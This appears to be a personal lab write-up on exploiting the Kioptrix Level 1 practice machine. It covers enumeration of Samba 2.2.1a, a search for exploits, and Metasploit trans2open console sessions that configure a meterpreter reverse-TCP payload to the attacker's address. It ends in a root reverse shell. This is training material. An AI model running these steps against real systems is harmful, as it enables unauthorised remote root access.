Exploit SMB

Exploit kioptrix level 1

ATTACKING SMB

-------------------------------------------------------
From Enumeration

port 139 (SMB)
139/tcp open netbios-ssn Samba smbd (workgroup: MYGROUP)
Unix (Samba 2.2.1a)

Google > Samba 2.2.1a exploit
exploit DB
https://www.exploit-db.com/exploits/10
https://www.exploit-db.com/exploits/7

rapid 7 (metasploit)
https://www.rapid7.com/db/modules/exploit/linux/samba/trans2open/
NOTE
Description

This exploits the buffer overflow found in Samba versions 2.2.0 to 2.2.8. This particular module is capable of exploiting the flaw on x86 Linux systems that do not have the noexec stack option set. NOTE: Some older versions of RedHat do not seem to be vulnerable since theyapparently do not allow anonymous access to IPC
WE tested and DID have anon access to IPC. CHECK!


---------------------------------------------------------------------------------

Victim - 192.168.247.129
attacker - 192.168.247.128



SEARCHSPLOIT <query>

searchspolit samba 2.2



Probable a 'trans2open' attack

BOOT UP METASPLOIT

search for 'trans2open' inside metasploit >> during enum a rapid 7 link was identified.



During enum it was identifed the system was running redhat > thus linux so option 1 for linux x86

view options

set RHOSTS <victim IP>

check IP was set

msf6 > use 1
[*] No payload configured, defaulting to linux/x86/meterpreter/reverse_tcp
msf6 exploit(linux/samba/trans2open) > options

Module options (exploit/linux/samba/trans2open):

Name Current Setting Required Description
---- --------------- -------- -----------
RHOSTS yes The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploi
t
RPORT 139 yes The target port (TCP)


Payload options (linux/x86/meterpreter/reverse_tcp):

Name Current Setting Required Description
---- --------------- -------- -----------
LHOST 192.168.247.128 yes The listen address (an interface may be specified)
LPORT 4444 yes The listen port


Exploit target:

Id Name
-- ----
0 Samba 2.2.x - Bruteforce


msf6 exploit(linux/samba/trans2open) > set RHOSTS 192.168.247.129
RHOSTS => 192.168.247.129
msf6 exploit(linux/samba/trans2open) > options

Module options (exploit/linux/samba/trans2open):

Name Current Setting Required Description
---- --------------- -------- -----------
RHOSTS 192.168.247.129 yes The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploi
t
RPORT 139 yes The target port (TCP)


Payload options (linux/x86/meterpreter/reverse_tcp):

Name Current Setting Required Description
---- --------------- -------- -----------
LHOST 192.168.247.128 yes The listen address (an interface may be specified)
LPORT 4444 yes The listen port


Exploit target:

Id Name
-- ----
0 Samba 2.2.x - Bruteforce



NOTE >>> Default meterpreter ports will prob get picked up...


Run or exploit



Sessions dieing > time to cancel and check options


Second time checking options after payload did not work meterpreter offeres payload options



Current paylaod is staged >>> see the ///



change payload to non staged > check with options

exploit!



Reverese shell with root access!!!!
